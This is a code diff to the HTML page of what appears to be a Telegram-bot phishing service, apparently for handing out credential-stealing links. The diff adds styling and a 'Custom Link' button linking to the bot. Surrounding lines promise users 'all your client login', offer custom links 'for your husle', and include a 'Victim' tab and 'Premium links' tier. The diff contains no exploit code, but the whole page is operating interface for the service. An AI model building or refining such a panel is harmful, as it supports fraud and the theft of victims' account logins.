@@ -66,7 +66,7 @@
     }
 
     .bottom-nav {
-      position: fixed; bottom: 0; left: 0; right: 0; height: 56px;
+      position: fixed; bottom: 0; left: 0; right: 0; height: 60px;
       background: #111; border-top: 1px solid #222;
       display: flex; justify-content: space-around; align-items: center;
     }
@@ -204,6 +204,37 @@
 </script>
       <p>Open the bot to receive all your client login.</p>
 <button id="openBotBtnHome" class="btn">Generate your own custom link that will work for your husle by clicking here.</button>
+<!-- 🔗 Custom Link Button (Free Section) -->
+<style>
+  .custom-link-btn {
+    max-width: 600px;
+    margin: 0 auto 15px auto;
+    margin-top: 20px;
+  }
+
+  .custom-link-btn a {
+    display: block;
+    background:#6cef8a;
+    padding: 14px;
+    border-radius: 12px;
+    text-align: center;
+    font-weight: 700;
+    font-size: 1.05rem;
+    color: black;
+    text-decoration: none;
+    transition: 0.3s ease;
+  }
+
+  .custom-link-btn a:hover {
+    background: #1e7e34;
+  }
+</style>
+
+<div class="custom-link-btn">
+  <a href="http://t.me/intelligentverificationlinkbot/customlink" target="_blank">
+    🔗 Custom Link
+  </a>
+</div>
 <ul id="freeLinksList" class="link-list"></ul>
     </section>
     <!-- Premium Section -->
@@ -232,7 +263,7 @@
   </main>
 <nav class="bottom-nav">
   <button onclick="showMyAd(); switchPage('home')" id="navHome" class="active">🏠<span>Home</span></button>
-  <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium</span></button>
+  <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium links</span></button>
   <button onclick="showMyAd(); switchPage('victim')" id="navVictim">👁️<span>Victim</span></button>
   <button onclick="switchPage('donate')" id="navDonate">💰<span>Donate</span></button>
   <a href="https://t.me/intelligentverificationlinkbot/about" target="_blank">
